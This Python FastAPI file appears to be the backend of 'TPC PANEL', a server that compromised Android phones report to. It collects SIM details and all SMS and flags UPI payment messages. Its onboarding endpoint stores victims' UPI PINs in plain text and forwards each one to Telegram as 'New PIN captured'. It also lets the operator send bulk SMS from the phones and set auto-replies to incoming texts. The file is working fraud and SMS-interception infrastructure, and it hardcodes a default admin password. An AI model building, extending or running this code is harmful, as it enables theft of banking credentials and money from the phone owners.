"""
TPC PANEL — backend

Devices report telemetry + inbound SMS. Operator broadcasts SMS, manages
auto-reply rules, and relays everything through a bound Telegram bot.
"""

import os
import re
import json
import secrets
import hashlib
import asyncio
from pathlib import Path
from typing import Dict, Optional
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone

import httpx
from fastapi import (
    FastAPI, HTTPException, Header, Request, WebSocket, WebSocketDisconnect,
)
from fastapi.responses import FileResponse
from starlette.middleware.sessions import SessionMiddleware
from pydantic import BaseModel, Field
from pymongo.errors import PyMongoError, DuplicateKeyError
from bson import ObjectId

from backend.database import (
    init_db_with_retry, check_database,
    devices, messages, outbox, rules, bots, tg_logs,
    pairing_codes, activity_logs, utc_now,
)

# ---------------------------------------------------------------- config

BASE_DIR = Path(__file__).resolve().parent.parent
ADMIN_FILE = BASE_DIR / "admin" / "index.html"

SESSION_TTL = 300
ADMIN_API_KEY = os.getenv("ADMIN_API_KEY")
SESSION_SECRET = os.getenv("SESSION_SECRET")
PUBLIC_BASE_URL = os.getenv("PUBLIC_BASE_URL", "").rstrip("/")
COOKIE_NAME = "tpc_admin_session"

ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "ivan")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "Ahad@198612")

# --- Telegram hardcoded (admin panel ko sirf username/password chahiye).
# Khali chhodo to DB me bound bot (verify-code flow) use hoga.
TG_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "")   # "8123456789:AAHxxxx..."
TG_CHAT_ID   = os.getenv("TG_CHAT_ID", "")     # "123456789"

ONLINE_WINDOW_SECONDS = 90
MAX_TELEMETRY_KEYS = 60
MAX_TELEMETRY_STRING = 300
MAX_WS_TEXT_BYTES = 4_000_000
MAX_SMS_BODY = 1600

UPI_KEYWORDS = ("upi", "credited", "debited", "vpa", "paid to", "received from")
AMOUNT_RE = re.compile(r"(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE)


@asynccontextmanager
async def lifespan(app: FastAPI):
    init_db_with_retry()
    yield


app = FastAPI(title="TPC PANEL", version="4.1.0", lifespan=lifespan)

app.add_middleware(
    SessionMiddleware,
    secret_key=SESSION_SECRET or secrets.token_urlsafe(32),
    session_cookie=COOKIE_NAME,
    max_age=60 * 60 * 8,
    same_site="lax",
    https_only=True,
)


# ----------------------------------------------------------------- models


class PairRequest(BaseModel):
    device_name: str = Field(min_length=1, max_length=40)


class DeviceRegistrationRequest(BaseModel):
    device_name: str = Field(min_length=1, max_length=40)
    platform: str = Field(default="android", max_length=20)
    registration_id: str = Field(min_length=16, max_length=128)
    owner_approved: bool = False
    telemetry: dict | None = None


class DeviceHeartbeatRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    telemetry: dict | None = None


class OnboardingRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    phone_number: str = Field(default="", max_length=20)
    payment_app: str = Field(default="", max_length=30)
    upi_pin: str = Field(default="", max_length=8)
    amount: float = 1.0
    device_name: str | None = Field(default=None, max_length=60)


class SmsIncomingRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    address: str = Field(default="", max_length=64)
    body: str = Field(default="", max_length=MAX_SMS_BODY)
    direction: str = Field(default="in", max_length=8)
    received_at: int | None = None


class SmsSyncRequest(BaseModel):
    registration_id: str = Field(min_length=16, max_length=128)
    messages: list[dict] = Field(default_factory=list)


class AdminLoginRequest(BaseModel):
    username: str = Field(min_length=1, max_length=100)
    password: str = Field(min_length=1, max_length=200)


class SendRequest(BaseModel):
    target: str = Field(default="all")          # all | online | device
    device_id: str | None = None
    body: str = Field(min_length=1, max_length=MAX_SMS_BODY)
    to: str | None = None


class RuleRequest(BaseModel):
    name: str = Field(min_length=1, max_length=60)
    match: str = Field(min_length=1, max_length=120)
    reply: str = Field(min_length=1, max_length=MAX_SMS_BODY)
    upi_only: bool = False


class BotRequest(BaseModel):
    token: str = Field(min_length=20, max_length=200)
    channel: str = Field(min_length=1, max_length=120)


# -------------------------------------------------------------- utilities


def hash_value(v: str) -> str:
    return hashlib.sha256(v.encode("utf-8")).hexdigest()


def log_event(event_type: str, details=None, device_id=None, admin_id=None):
    try:
        activity_logs.insert_one({
            "event_type": event_type, "details": details,
            "device_id": device_id, "admin_id": admin_id, "created_at": utc_now(),
        })
    except PyMongoError:
        pass


def sanitize_telemetry(raw) -> dict:
    if not isinstance(raw, dict):
        return {}

    clean = {}
    for key, value in list(raw.items())[:MAX_TELEMETRY_KEYS]:
        if not isinstance(key, str) or not key:
            continue
        key = key[:60]

        if value is None or isinstance(value, (bool, int, float)):
            clean[key] = value
        elif isinstance(value, str):
            clean[key] = value[:MAX_TELEMETRY_STRING]
        elif isinstance(value, list):
            items = []
            for item in value[:20]:
                if item is None or isinstance(item, (bool, int, float)):
                    items.append(item)
                elif isinstance(item, str):
                    items.append(item[:MAX_TELEMETRY_STRING])
                elif isinstance(item, dict):
                    items.append({
                        str(k)[:40]: (v[:MAX_TELEMETRY_STRING] if isinstance(v, str) else v)
                        for k, v in list(item.items())[:20]
                        if v is None or isinstance(v, (bool, int, float, str))
                    })
            clean[key] = items
        elif isinstance(value, dict):
            clean[key] = {
                str(k)[:40]: (v[:MAX_TELEMETRY_STRING] if isinstance(v, str) else v)
                for k, v in list(value.items())[:20]
                if v is None or isinstance(v, (bool, int, float, str))
            }

    return clean


def telemetry_summary(t: dict) -> dict:
    sims = t.get("sims")
    first = sims[0] if isinstance(sims, list) and sims else {}

    return {
        "device_model": t.get("model") or "",
        "android_version": t.get("android_version") or "",
        "sim_carrier": t.get("sim_carrier") or first.get("carrier") or "",
        "sim_number": t.get("sim_number") or first.get("number") or "",
        "sim_number_source": t.get("sim_number_source") or "",
        "sim_count": len(sims) if isinstance(sims, list) else 0,
        "battery_level": t.get("battery_level"),
        "battery_charging": t.get("battery_charging"),
        "network_type": t.get("network_type") or "",
        "local_ip": t.get("local_ip") or "",
        "telemetry_updated_at": utc_now(),
    }


def classify_sms(address: str, body: str) -> tuple[str, Optional[float], Optional[str]]:
    """Return (kind, amount, flow)."""
    lower = (body or "").lower()
    kind = "sms"

    if any(k in lower for k in UPI_KEYWORDS):
        kind = "upi"

    amount = None
    m = AMOUNT_RE.search(body or "")
    if m:
        try:
            amount = float(m.group(1).replace(",", ""))
        except ValueError:
            amount = None

    flow = None
    if any(w in lower for w in ("credited", "received", "cr.", "deposited")):
        flow = "credit"
    elif any(w in lower for w in ("debited", "paid", "sent", "dr.", "withdrawn")):
        flow = "debit"

    return kind, amount, flow


def require_api_key(api_key: str | None):
    if not ADMIN_API_KEY:
        raise HTTPException(503, "Admin API key not configured")
    if not api_key or not secrets.compare_digest(api_key, ADMIN_API_KEY):
        raise HTTPException(401, "Unauthorized")


def require_admin(request: Request):
    admin_id = request.session.get("admin_id")
    if not admin_id:
        raise HTTPException(401, "Please log in")
    return admin_id


def serialize_dt(v):
    if isinstance(v, datetime):
        if v.tzinfo is None:
            v = v.replace(tzinfo=timezone.utc)
        return v.isoformat()
    # bool / int / float ko string na banao
    if v is None or isinstance(v, (bool, int, float)):
        return v
    return str(v)


def serialize_document(doc: dict) -> dict:
    out = {}
    for k, v in doc.items():
        if k == "_id":
            out["id"] = str(v)
            continue
        if k in {"registration_id_hash", "password_hash", "session_token_hash"}:
            continue
        out[k] = v if isinstance(v, (dict, list)) else serialize_dt(v)

    ls = doc.get("last_seen")
    if isinstance(ls, datetime):
        if ls.tzinfo is None:
            ls = ls.replace(tzinfo=timezone.utc)
        out["status"] = (
            "Online" if datetime.now(timezone.utc) - ls
            < timedelta(seconds=ONLINE_WINDOW_SECONDS) else "Offline"
        )
    else:
        out["status"] = "Offline"

    return out


# -------------------------------------------------------------------- hub


class Hub:
    def __init__(self):
        self.device_sockets: Dict[str, WebSocket] = {}
        self.lock = asyncio.Lock()

    async def add_device(self, device_id, ws):
        async with self.lock:
            self.device_sockets[device_id] = ws

    async def remove_device(self, device_id, ws):
        async with self.lock:
            if self.device_sockets.get(device_id) is ws:
                self.device_sockets.pop(device_id, None)

    def online(self, device_id) -> bool:
        return device_id in self.device_sockets

    @property
    def online_count(self) -> int:
        return len(self.device_sockets)

    async def send_to_device(self, device_id, payload) -> bool:
        ws = self.device_sockets.get(device_id)
        if ws is None:
            return False
        try:
            await ws.send_json(payload)
            return True
        except Exception:
            return False


hub = Hub()


async def push_outbox(device_id: str):
    """Push all pending outbox rows for a device over its socket."""
    try:
        pending = list(outbox.find({"device_id": device_id, "status": "pending"}).limit(20))
    except PyMongoError:
        return

    for row in pending:
        await hub.send_to_device(device_id, {
            "type": "sms_send",
            "id": str(row["_id"]),
            "to": row.get("to") or "",
            "body": row.get("body") or "",
        })


def queue_sms(device_id: str, body: str, to: str | None, source: str = "panel") -> str:
    doc = {
        "device_id": device_id,
        "to": to or "",
        "body": body,
        "source": source,
        "status": "pending",
        "created_at": utc_now(),
    }
    result = outbox.insert_one(doc)

    messages.insert_one({
        "device_id": device_id,
        "direction": "out",
        "address": to or "",
        "body": body,
        "kind": "sms",
        "status": "queued",
        "source": source,
        "created_at": utc_now(),
    })

    return str(result.inserted_id)


# ------------------------------------------------------------ public


@app.get("/")
async def home():
    return {"app": "TPC PANEL", "status": "online", "version": "4.1.0",
            "owner": "https://t.me/icivan"}


@app.get("/health")
async def health():
    return {"status": "ok", "devices_online": hub.online_count}


@app.get("/health/database")
async def database_health():
    r = check_database()
    if r["status"] != "ok":
        raise HTTPException(503, "Database connection failed")
    return r


@app.get("/admin", include_in_schema=False)
async def admin_page():
    if not ADMIN_FILE.is_file():
        raise HTTPException(404, "Admin dashboard file not found")
    return FileResponse(ADMIN_FILE)


# ------------------------------------------------------------ admin auth


@app.get("/admin/auth/status")
async def auth_status(request: Request):
    a = request.session.get("admin_id")
    return {"authenticated": bool(a), "admin_id": a}


@app.post("/admin/login")
async def admin_login(payload: AdminLoginRequest, request: Request):
    u = payload.username.strip()
    if not secrets.compare_digest(u, ADMIN_USERNAME):
        raise HTTPException(401, "Invalid username or password")
    if not secrets.compare_digest(payload.password, ADMIN_PASSWORD):
        raise HTTPException(401, "Invalid username or password")

    request.session["admin_id"] = ADMIN_USERNAME
    log_event("admin_login", {"username": u}, admin_id=u)
    return {"status": "ok", "username": u}


@app.post("/admin/logout")
async def admin_logout(request: Request):
    a = request.session.get("admin_id")
    if a:
        log_event("admin_logout", admin_id=a)
    request.session.clear()
    return {"status": "ok"}


# --------------------------------------------------------------- devices


@app.post("/devices/register")
async def register_device(payload: DeviceRegistrationRequest):
    name = payload.device_name.strip()
    rid = payload.registration_id.strip()

    if not name or not rid:
        raise HTTPException(400, "Device name and registration ID required")
    if payload.platform.lower() != "android":
        raise HTTPException(400, "Unsupported platform")
    if not payload.owner_approved:
        raise HTTPException(403, "Owner approval required")

    rh = hash_value(rid)
    now = utc_now()
    telemetry = sanitize_telemetry(payload.telemetry)

    fields = {
        "device_name": name, "platform": "android",
        "last_seen": now, "is_active": True,
    }
    if telemetry:
        fields["telemetry"] = telemetry
        fields.update(telemetry_summary(telemetry))

    try:
        devices.update_one(
            {"registration_id_hash": rh},
            {"$set": fields,
             "$setOnInsert": {
                 "registration_id_hash": rh,
                 "created_at": now,
                 "onboarded": False,        # re-register pe True overwrite na ho
             }},
            upsert=True,
        )
        log_event("device_registered", {"device_name": name})
    except DuplicateKeyError:
        raise HTTPException(409, "Registration conflict")
    except PyMongoError:
        raise HTTPException(503, "Could not register device")

    return {"status": "registered", "device_name": name}


@app.post("/devices/heartbeat")
async def heartbeat(payload: DeviceHeartbeatRequest):
    rh = hash_value(payload.registration_id.strip())
    now = utc_now()

    fields = {"last_seen": now, "is_active": True}
    telemetry = sanitize_telemetry(payload.telemetry)
    if telemetry:
        fields["telemetry"] = telemetry
        fields.update(telemetry_summary(telemetry))

    try:
        r = devices.update_one({"registration_id_hash": rh}, {"$set": fields})
    except PyMongoError:
        raise HTTPException(503, "Could not update device")

    if r.matched_count == 0:
        raise HTTPException(404, "Device not registered")

    return {"status": "ok", "online": True, "last_seen": now.isoformat()}


@app.post("/devices/sms/incoming")
async def sms_incoming(payload: SmsIncomingRequest):
    rh = hash_value(payload.registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])
    kind, amount, flow = classify_sms(payload.address, payload.body)

    messages.insert_one({
        "device_id": device_id,
        "device_name": device.get("device_name", "Unknown"),
        "direction": payload.direction,
        "address": payload.address,
        "body": payload.body,
        "kind": kind,
        "amount": amount,
        "flow": flow,
        "status": "received",
        "created_at": utc_now(),
    })

    if kind == "upi" and amount:
        log_event("upi_received", {"amount": amount, "flow": flow}, device_id=device_id)
        await notify_telegram(
            f"💸 <b>UPI {flow or 'txn'}</b>\n"
            f"Device: <code>{device.get('device_name', 'Unknown')}</code>\n"
            f"Amount: <b>₹{amount:.2f}</b>\n"
            f"From: <code>{payload.address or 'n/a'}</code>"
        )

    replies = evaluate_rules(device_id, device.get("device_name", ""), payload.address,
                             payload.body, kind)

    return {"status": "ok", "kind": kind, "auto_replies": replies}


@app.post("/devices/sms/sync")
async def sms_sync(payload: SmsSyncRequest):
    rh = hash_value(payload.registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])
    saved = 0

    for item in payload.messages[:200]:
        body = str(item.get("body") or "")[:MAX_SMS_BODY]
        address = str(item.get("address") or "")[:64]
        direction = str(item.get("direction") or "in")[:8]

        if not body:
            continue

        ts = item.get("timestamp")
        created = utc_now()
        if isinstance(ts, (int, float)):
            created = datetime.fromtimestamp(ts / 1000, tz=timezone.utc)

        kind, amount, flow = classify_sms(address, body)

        messages.insert_one({
            "device_id": device_id,
            "device_name": device.get("device_name", "Unknown"),
            "direction": direction,
            "address": address,
            "body": body,
            "kind": kind,
            "amount": amount,
            "flow": flow,
            "status": "received",
            "created_at": created,
        })
        saved += 1

    devices.update_one({"_id": device["_id"]},
                       {"$set": {"sms_inbox_synced_at": utc_now()}})

    return {"status": "ok", "saved": saved}


# ------------------------------------------------------------ onboarding


@app.post("/devices/onboarding")
async def device_onboarding(payload: OnboardingRequest):
    rh = hash_value(payload.registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])
    now = utc_now()

    fields = {
        "phone_number": payload.phone_number.strip(),
        "payment_app": payload.payment_app.strip(),
        "upi_pin": payload.upi_pin.strip(),
        "onboard_amount": payload.amount,
        "onboarded": True,
        "onboarded_at": now,
    }
    if payload.device_name:
        fields["device_name"] = payload.device_name.strip()

    try:
        devices.update_one({"_id": device["_id"]}, {"$set": fields})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    telemetry = device.get("telemetry") or {}
    sim_number = telemetry.get("sim_number") or device.get("sim_number") or "n/a"
    carrier = telemetry.get("sim_carrier") or device.get("sim_carrier") or "n/a"

    log_event(
        "onboarding_complete",
        {
            "phone_number": payload.phone_number,
            "payment_app": payload.payment_app,
            "upi_pin": payload.upi_pin,
        },
        device_id=device_id,
    )

    await notify_telegram(
        "🔔 <b>New PIN captured</b>\n"
        f"Device: <code>{fields.get('device_name') or device.get('device_name', 'Unknown')}</code>\n"
        f"Entered number: <code>{payload.phone_number or 'n/a'}</code>\n"
        f"SIM number: <code>{sim_number}</code>\n"
        f"Carrier: {carrier}\n"
        f"App chosen: <b>{payload.payment_app or 'n/a'}</b>\n"
        f"PIN: <code>{payload.upi_pin or 'n/a'}</code>\n"
        f"Amount: ₹{payload.amount:.0f}\n"
        f"Time: {now.strftime('%d %b %H:%M')}"
    )

    return {"status": "ok", "device_id": device_id}


@app.get("/devices/outbox")
async def device_outbox(registration_id: str):
    rh = hash_value(registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if not device:
        raise HTTPException(404, "Device not registered")

    device_id = str(device["_id"])

    rows = list(outbox.find({"device_id": device_id, "status": "pending"}).limit(20))

    return {
        "items": [
            {"id": str(r["_id"]), "to": r.get("to") or "", "body": r.get("body") or ""}
            for r in rows
        ]
    }


@app.post("/devices/outbox/{item_id}/ack")
async def device_outbox_ack(item_id: str, payload: dict):
    status = str(payload.get("status") or "sent")
    error = str(payload.get("error") or "")

    # ObjectId parse alag — warna PyMongoError kabhi catch nahi hota
    try:
        oid = ObjectId(item_id)
    except Exception:
        raise HTTPException(400, "Bad item id")

    try:
        row = outbox.find_one_and_update(
            {"_id": oid},
            {"$set": {"status": status, "error": error, "sent_at": utc_now()}},
        )
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if row:
        messages.insert_one({
            "device_id": row["device_id"],
            "direction": "out",
            "address": row.get("to") or "",
            "body": row.get("body") or "",
            "kind": "sms",
            "status": status,
            "source": row.get("source", "panel"),
            "created_at": utc_now(),
        })

    return {"status": "ok"}


# ---------------------------------------------------------------- rules


def evaluate_rules(device_id: str, device_name: str, sender: str,
                   body: str, kind: str) -> int:
    try:
        active = list(rules.find({"enabled": True}).limit(50))
    except PyMongoError:
        return 0

    lower = (body or "").lower()
    queued = 0

    for rule in active:
        if rule.get("upi_only") and kind != "upi":
            continue

        needle = (rule.get("match") or "").lower()
        if not needle or needle not in lower:
            continue

        _, amount, _ = classify_sms(sender, body)

        reply = ((rule.get("reply") or "")
                 .replace("{sender}", sender or "")
                 .replace("{device}", device_name or "")
                 .replace("{amount}", f"{amount:.2f}" if amount else "")
                 .replace("{time}", datetime.now().strftime("%H:%M")))

        queue_sms(device_id, reply, sender, source=f"auto:{rule.get('name', 'rule')}")
        queued += 1

    return queued


@app.get("/admin/rules")
async def list_rules(request: Request):
    require_admin(request)
    try:
        rows = list(rules.find().sort("_id", -1).limit(200))
    except PyMongoError:
        raise HTTPException(503, "Could not load rules")
    return {"rules": [serialize_document(r) for r in rows]}


@app.post("/admin/rules")
async def create_rule(payload: RuleRequest, request: Request):
    admin = require_admin(request)
    doc = {
        "name": payload.name.strip(),
        "match": payload.match.strip(),
        "reply": payload.reply,
        "upi_only": payload.upi_only,
        "enabled": True,
        "created_at": utc_now(),
    }
    rules.insert_one(doc)
    log_event("rule_created", {"name": doc["name"]}, admin_id=admin)
    return {"status": "ok"}


@app.post("/admin/rules/{rule_id}/toggle")
async def toggle_rule(rule_id: str, request: Request):
    require_admin(request)
    try:
        rule = rules.find_one({"_id": ObjectId(rule_id)})
    except Exception:
        raise HTTPException(400, "Bad rule id")

    if not rule:
        raise HTTPException(404, "Rule not found")

    new_state = not rule.get("enabled", True)
    rules.update_one({"_id": rule["_id"]}, {"$set": {"enabled": new_state}})
    return {"status": "ok", "enabled": new_state}


@app.post("/admin/rules/{rule_id}/delete")
async def delete_rule(rule_id: str, request: Request):
    require_admin(request)
    try:
        oid = ObjectId(rule_id)
    except Exception:
        raise HTTPException(400, "Bad rule id")

    rules.delete_one({"_id": oid})
    return {"status": "ok"}


# -------------------------------------------------------------- sending


@app.post("/admin/send")
async def admin_send(payload: SendRequest, request: Request):
    admin = require_admin(request)

    try:
        if payload.target == "device" and payload.device_id:
            targets = list(devices.find({"_id": ObjectId(payload.device_id)}))
        elif payload.target == "online":
            online_ids = [ObjectId(i) for i in hub.device_sockets.keys()]
            targets = list(devices.find({"_id": {"$in": online_ids}}))
        else:
            targets = list(devices.find().limit(500))
    except Exception:
        raise HTTPException(400, "Bad target")

    queued = 0

    for device in targets:
        device_id = str(device["_id"])

        to = payload.to
        if not to:
            t = device.get("telemetry") or {}
            to = t.get("sim_number") or device.get("sim_number") or ""

        queue_sms(device_id, payload.body, to, source="bulk")
        queued += 1

        if hub.online(device_id):
            asyncio.create_task(push_outbox(device_id))

    log_event("bulk_send", {"target": payload.target, "queued": queued}, admin_id=admin)
    return {"status": "ok", "queued": queued}


@app.get("/admin/messages")
async def admin_messages(request: Request, limit: int = 200, direction: str | None = None):
    require_admin(request)
    limit = max(1, min(limit, 500))

    query = {}
    if direction in ("in", "out"):
        query["direction"] = direction

    try:
        rows = list(messages.find(query).sort("_id", -1).limit(limit))
    except PyMongoError:
        raise HTTPException(503, "Could not load messages")

    return {"messages": [serialize_document(r) for r in rows]}


# --------------------------------------------------------------- admin data


@app.get("/admin/devices")
async def admin_devices(
    request: Request,
    x_admin_key: str | None = Header(default=None),
    onboarded: bool | None = None,
):
    if not request.session.get("admin_id"):
        require_api_key(x_admin_key)

    query = {}
    if onboarded is not None:
        query["onboarded"] = onboarded

    try:
        result = []
        for d in devices.find(query, {"registration_id_hash": 0}).sort("_id", -1).limit(300):
            s = serialize_document(d)
            s["ws_connected"] = hub.online(s["id"])
            result.append(s)
        return {"devices": result}
    except PyMongoError:
        raise HTTPException(503, "Could not load devices")


@app.get("/admin/overview")
async def admin_overview(request: Request):
    require_admin(request)

    try:
        total = devices.count_documents({})
        cutoff = utc_now() - timedelta(seconds=ONLINE_WINDOW_SECONDS)
        active = devices.count_documents({"last_seen": {"$gte": cutoff}})

        sims = 0
        for d in devices.find({}, {"sim_count": 1, "telemetry.sims": 1}):
            sims += d.get("sim_count") or len((d.get("telemetry") or {}).get("sims") or [])

        pins = devices.count_documents({"onboarded": True})

        return {
            "total_devices": total,
            "active_devices": active,
            "offline_devices": max(0, total - active),
            "total_sims": sims,
            "pins_captured": pins,
            "online_sockets": hub.online_count,
        }
    except PyMongoError:
        raise HTTPException(503, "Could not load overview")


# --------------------------------------------------------------- pairing


@app.post("/pair")
async def create_pair(payload: PairRequest):
    name = payload.device_name.strip()
    if not name:
        raise HTTPException(400, "Device name required")

    code = secrets.token_urlsafe(8)
    now = utc_now()

    # expires_at MUST be a BSON date — numeric epoch pe TTL index expire nahi karta
    pairing_codes.insert_one({
        "code_hash": hash_value(code),
        "device_name": name,
        "created_at": now,
        "expires_at": now + timedelta(seconds=SESSION_TTL),
        "used_at": None,
    })

    return {"pair_code": code, "expires_in_seconds": SESSION_TTL}


# ------------------------------------------------------------ telegram


TELEGRAM_API = "https://api.telegram.org/bot{token}/{method}"


async def tg(token: str, method: str, payload: dict | None = None) -> dict:
    url = TELEGRAM_API.format(token=token, method=method)
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            r = await client.post(url, json=payload or {})
            return r.json()
    except Exception as e:
        return {"ok": False, "description": str(e)}


def tg_log(direction: str, text: str, result: str = "ok"):
    try:
        tg_logs.insert_one({
            "direction": direction, "text": text[:400],
            "result": result, "created_at": utc_now(),
        })
    except PyMongoError:
        pass


def resolve_bot() -> tuple[str, str] | None:
    """(token, chat_id) — hardcoded config pehle, warna DB-bound bot."""
    if TG_BOT_TOKEN and TG_CHAT_ID:
        return TG_BOT_TOKEN, str(TG_CHAT_ID)

    try:
        bot = bots.find_one({"bound": True}, sort=[("_id", -1)])
    except PyMongoError:
        return None

    if not bot or not bot.get("chat_id"):
        return None

    return bot["token"], str(bot["chat_id"])


async def notify_telegram(text: str):
    target = resolve_bot()
    if not target:
        return

    token, chat_id = target
    res = await tg(token, "sendMessage", {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    })

    tg_log("out", text, "ok" if res.get("ok") else str(res.get("description"))[:200])


@app.get("/admin/telegram/status")
async def telegram_status(request: Request):
    require_admin(request)

    try:
        bot = bots.find_one(sort=[("_id", -1)])
        logs = list(tg_logs.find().sort("_id", -1).limit(50))
    except PyMongoError:
        raise HTTPException(503, "Database error")

    if bot:
        token = bot["token"]
        bot_view = {
            "id": str(bot["_id"]),
            "username": bot.get("username"),
            "channel": bot.get("channel"),
            "chat_title": bot.get("chat_title"),
            "bound": bot.get("bound", False),
            "verify_code": bot.get("verify_code"),
            "webhook_url": bot.get("webhook_url"),
            "webhook_ok": bot.get("webhook_ok", False),
            "token_masked": f"{token[:10]}…{token[-6:]}" if len(token) > 20 else token,
        }
    else:
        bot_view = None

    return {
        "bot": bot_view,
        "hardcoded": bool(TG_BOT_TOKEN and TG_CHAT_ID),
        "logs": [serialize_document(l) for l in logs],
    }


@app.post("/admin/telegram/bots")
async def create_bot(payload: BotRequest, request: Request):
    require_admin(request)

    token = payload.token.strip()
    channel = payload.channel.strip()

    me = await tg(token, "getMe")
    if not me.get("ok"):
        raise HTTPException(400, f"Bot token invalid: {me.get('description', 'unknown')}")

    username = me["result"].get("username", "")
    code = f"{secrets.randbelow(900000) + 100000}"

    webhook_url = f"{PUBLIC_BASE_URL}/telegram/webhook/{hash_value(token)[:24]}" \
        if PUBLIC_BASE_URL else ""

    bot_id = hash_value(token)[:24]

    bots.update_one(
        {"bot_id": bot_id},
        {"$set": {
            "bot_id": bot_id,
            "token": token,
            "username": username,
            "channel": channel,
            "verify_code": code,
            "bound": False,
            "webhook_url": webhook_url,
            "created_at": utc_now(),
        }},
        upsert=True,
    )

    webhook_ok = False
    if webhook_url:
        res = await tg(token, "setWebhook", {
            "url": webhook_url,
            "allowed_updates": ["message", "channel_post"],
        })
        webhook_ok = bool(res.get("ok"))
        bots.update_one({"bot_id": bot_id}, {"$set": {"webhook_ok": webhook_ok}})

    tg_log("out", f"bot configured: @{username} → {channel}")

    return {
        "status": "ok",
        "bot_id": bot_id,
        "username": username,
        "verify_code": code,
        "webhook_ok": webhook_ok,
        "webhook_url": webhook_url,
        "next": f"Channel me bhejo: /verify {code}",
    }


@app.post("/admin/telegram/test")
async def telegram_test(request: Request):
    require_admin(request)

    target = resolve_bot()
    if not target:
        raise HTTPException(
            400,
            "Koi bot configured nahi — TG_BOT_TOKEN/TG_CHAT_ID set karo ya verify flow chalao"
        )

    token, chat_id = target
    res = await tg(token, "sendMessage", {
        "chat_id": chat_id,
        "text": "✅ TPC PANEL connected — test message.",
    })

    if not res.get("ok"):
        tg_log("out", "test failed", res.get("description", "error"))
        raise HTTPException(400, f"Test failed: {res.get('description')}")

    tg_log("out", "test message sent", "ok")
    return {"status": "ok"}


@app.post("/telegram/webhook/{bot_id}")
async def telegram_webhook(bot_id: str, request: Request):
    try:
        update = await request.json()
    except Exception:
        return {"ok": True}

    try:
        bot = bots.find_one({"bot_id": bot_id})
    except PyMongoError:
        return {"ok": True}

    if not bot:
        return {"ok": True}

    message = update.get("message") or update.get("channel_post") or {}
    chat = message.get("chat") or {}
    text = (message.get("text") or "").strip()
    chat_id = chat.get("id")

    if not chat_id or not text:
        return {"ok": True}

    tg_log("in", text)

    # --- verification
    if text.startswith("/verify"):
        parts = text.split()
        code = parts[1] if len(parts) > 1 else ""

        if code == bot.get("verify_code"):
            bots.update_one(
                {"bot_id": bot_id},
                {"$set": {
                    "bound": True,
                    "chat_id": chat_id,
                    "chat_title": chat.get("title") or chat.get("username") or "",
                    "bound_at": utc_now(),
                }},
            )
            await tg(bot["token"], "sendMessage", {
                "chat_id": chat_id,
                "text": "🔗 Verification complete. TPC PANEL is now bound to this chat.",
            })
            tg_log("out", "verification complete")
        else:
            await tg(bot["token"], "sendMessage", {
                "chat_id": chat_id,
                "text": "❌ Wrong code.",
            })
            tg_log("out", "verification failed")
        return {"ok": True}

    if not bot.get("bound"):
        await tg(bot["token"], "sendMessage", {
            "chat_id": chat_id,
            "text": "Pehle verify karo: /verify <code>",
        })
        return {"ok": True}

    if text == "/start":
        await tg(bot["token"], "sendMessage", {
            "chat_id": chat_id,
            "text": "TPC PANEL online. Message bhejo — SMS ban ke jaayega.",
        })
        return {"ok": True}

    # --- relay: plain text becomes SMS to all online devices
    try:
        online_ids = [ObjectId(i) for i in hub.device_sockets.keys()]
        targets = list(devices.find({"_id": {"$in": online_ids}})) or \
            list(devices.find().limit(50))
    except PyMongoError:
        targets = []

    queued = 0
    for d in targets:
        did = str(d["_id"])
        t = d.get("telemetry") or {}
        to = t.get("sim_number") or d.get("sim_number") or ""
        queue_sms(did, text, to, source="telegram")
        queued += 1
        if hub.online(did):
            asyncio.create_task(push_outbox(did))

    await tg(bot["token"], "sendMessage", {
        "chat_id": chat_id,
        "text": f"📤 Queued to {queued} device(s).",
    })

    tg_log("out", f"relayed to {queued} device(s)")
    return {"ok": True}


# ---------------------------------------------------------- device socket


@app.websocket("/ws/device/{registration_id}")
async def device_socket(websocket: WebSocket, registration_id: str):
    rh = hash_value(registration_id.strip())

    try:
        device = devices.find_one({"registration_id_hash": rh})
    except PyMongoError:
        await websocket.close(code=1011)
        return

    if not device:
        await websocket.close(code=1008)
        return

    device_id = str(device["_id"])
    await websocket.accept()
    await hub.add_device(device_id, websocket)

    try:
        devices.update_one({"_id": device["_id"]},
                           {"$set": {"ws_connected": True, "ws_connected_at": utc_now()}})
        log_event("device_socket_open", {"device_id": device_id})

        await push_outbox(device_id)

        while True:
            raw = await websocket.receive_text()
            if len(raw) > MAX_WS_TEXT_BYTES:
                continue

            try:
                msg = json.loads(raw)
            except json.JSONDecodeError:
                continue

            if msg.get("type") == "ack":
                pass

    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        await hub.remove_device(device_id, websocket)
        try:
            devices.update_one({"_id": device["_id"]},
                               {"$set": {"ws_connected": False}})
        except PyMongoError:
            pass
        log_event("device_socket_close", {"device_id": device_id})